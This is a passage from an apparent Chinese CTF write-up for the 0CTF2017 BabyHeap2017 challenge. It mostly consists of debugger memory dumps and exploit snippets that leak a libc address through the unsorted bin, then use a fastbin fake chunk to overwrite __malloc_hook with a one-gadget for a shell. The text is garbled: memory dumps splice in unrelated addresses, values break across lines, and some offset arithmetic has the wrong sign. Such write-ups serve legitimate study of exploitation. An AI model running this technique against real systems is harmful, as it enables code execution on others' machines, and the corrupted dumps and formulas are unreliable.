0x555555757050: 0x4242424242424242 0x4242424242424242
0x555555757060: 0x0000000000000000 0x0000000000000021  chunk 0
0xafc966564d0: 0x0000555555757010 0x0000000000000001  new chunk 1
0xafc966564e0: 0x0000000000000010 0x0000555555757050
0xafc966564f0: 0x0000000000000001 0x0000000000000010  new chunk 2
0xafc96656500: 0x0000555555757090 0x0000000000000001  chunk 3
0xafc96656510: 0x0000000000000010 0x0000555555757070
0xafc96656520: 0x0000000000000001 0x0000000000000080  chunk 4
0xafc96656530: 0x0000555555757090 0x0000000000000001  chunk 5
0xafc96656540: 0x0000000000000080 0x0000555555757120
0xafc96656550: 0x0000000000000000 0x0000000000000000
这时，如果我们将 chunk 4 释放掉，其 fd 指针会被设置为指向 unsorted bin 链表
的头部，这个地址在 libc 中，且相对位置固定，利用它就可以算出 libc 被加载的地
址：
free(4)
gef➤ heap bins unsorted
[ Unsorted Bin for arena 'main_arena' ]
[+] unsorted_bins[0]: fw=0x555555757080, bk=0x555555757080
→ Chunk(addr=0x555555757090, size=0x90, flags=PREV_INUSE)
gef➤ x/60gx 0x0000555555757010-0x10
0x555555757000: 0x0000000000000000 0x0000000000000021  chunk 0
0xafc966564d0: 0x0000555555757010 0x0000000000000001  new chunk 1
0xafc966564e0: 0x0000000000000010 0x0000555555757050
0xafc966564f0: 0x0000000000000001 0x0000000000000010  new chunk 2
0xafc96656500: 0x0000555555757090 0x0000000000000001  chunk 3
0xafc96656510: 0x0000000000000010 0x0000555555757070
0xafc96656520: 0x0000000000000000 0x0000000000000000
0xafc96656530: 0x0000000000000000 0x0000000000000001  chunk 5
0xafc96656540: 0x0000000000000080 0x0000555555757120
0xafc96656550: 0x0000000000000000 0x0000000000000000
最后利用 Dump 操作即可将地址泄漏出来：
leak = u64(dump(2)[:8])
libc = leak - 0x3c4b78 # 0x3c4b78 = leak - libc
__malloc_hook = libc - 0x3c4b10 # readelf -s libc.so.6 | grep
__malloc_hook@
one_gadget = libc - 0x4526a
1074
6.1.10 pwn 0CTF2017 BabyHeap2017
[*] leak => 0x7ffff7dd1b78
[*] libc => 0x7ffff7a0d000
[*] __malloc_hook => 0x7ffff7dd1b10
[*] one_gadget => 0x7ffff7a5226a
get shell
由于开启了 Full RELRO，改写 GOT 表是不行了。考虑用 __malloc_hook ，它
是一个弱类型的函数指针变量，指向 void * function(size_t size, void *
caller) ，当调用 malloc() 时，首先判断 hook 函数指针是否为空，不为空则调用
它。所以这里我们传入一个 one-gadget 即可（详情请查看章节4.6）。
首先考虑怎样利用 fastbins 在 __malloc_hook 指向的地址处写入 one_gadget 的
地址。这里有一个技巧，地址偏移，就像下面这样构造一个 fake chunk，其大小为
0x7f，也就是一个 fast chunk：
gef➤ x/10gx (long long)(&main_arena)-0x30
0x7ffff7dd1af0 : 0x00007ffff7dd0260 0
x0000000000000000
0x7ffff7dd1b00 : 0x00007ffff7a92e20 0x000
07ffff7a92a00
0x7ffff7dd1b10 : 0x0000000000000000 0x00000
00000000000
0x7ffff7dd1b20 : 0x0000000000000000 0x41414141
41414141 : 0x0000000000000000 0x00000
00000000000
gef➤ x/10gx (long long)(&main_arena)-0x30+0xd
0x7ffff7dd1afd: 0xfff7a92e20000000 0xfff7a92a0000007f
 ?v 0x7ffff7dd1b78 - 0x7ffff7a0d000
0x3c4b78
之前 free 掉的 chunk 4 一个 small chunk，被添加到了 unsorted bin 中，而这里我
们需要的是 fast chunk，所以这里采用分配一个 fast chunk，再释放掉的办法，将
其添加到 fast bins 中。然后改写它的 fd 指针指向 fake chunk（当然也要通过 libc
偏移计算出来）：
alloc(0x60)
free(4)
payload = p64(libc + 0x3c4afd)
fill(2, payload)
gef➤ heap bins unsorted
[ Unsorted Bin for arena 'main_arena' ]
[+] unsorted_bins[0]: fw=0x5555557570f0, bk=0x5555557570f0
→ Chunk(addr=0x555555757100, size=0x20, flags=PREV_INUSE)
gef➤ x/60gx 0x0000555555757010-0x10
0x555555757000: 0x0000000000000000 0x0000000000000021 : 0x00007ffff7dd0260 0
x0000000000000000
0x7ffff7dd1b00 : 0x00007ffff7a92e20 0x000
000fff7a92a00
0x7ffff7dd1b10 : 0x00007ffff7a5226a 0x00000
00000000000 : 0x0000000000000000 0x41414141
41414141
0x7ffff7dd1b30 : 0x0000000000000000 0x00000
00000000000
gef➤ x/60gx 0x0000555555757010-0x10
0x555555757000: 0x0000000000000000 0x0000000000000021  chunk 0
0xafc966564d0: 0x0000555555757010 0x0000000000000001  new chunk 1
0xafc966564e0: 0x0000000000000010 0x0000555555757050
0xafc966564f0: 0x0000000000000001 0x0000000000000010  new chunk 2
0xafc96656500: 0x0000555555757090 0x0000000000000001  chunk 3
0xafc96656510: 0x0000000000000010 0x0000555555757070
0xafc96656520: 0x0000000000000001 0x0000000000000060  new new chunk4
0xafc96656530: 0x0000555555757090 0x0000000000000001  chunk 5
0xafc96656540: 0x0000000000000080 0x0000555555757120
0xafc96656550: 0x0000000000000001 0x0000000000000060  chunk 6
0xafc96656560: 0x00007ffff7dd1b0d 0x0000000000000000
0xafc96656570: 0x0000000000000000 0x0000000000000000
0xafc96656580: 0x0000000000000000 0x0000000000000000
0xafc96656590: 0x0000000000000000 0x0000000000000000
0xafc966565a0: 0x0000000000000000 0x0000000000000000
最后，只要调用了 malloc，就会触发 hook 函数，即 one-gadget。现在可以开启
ASLR 了，因为通过泄漏 libc 地址，我们已经完全绕过了它。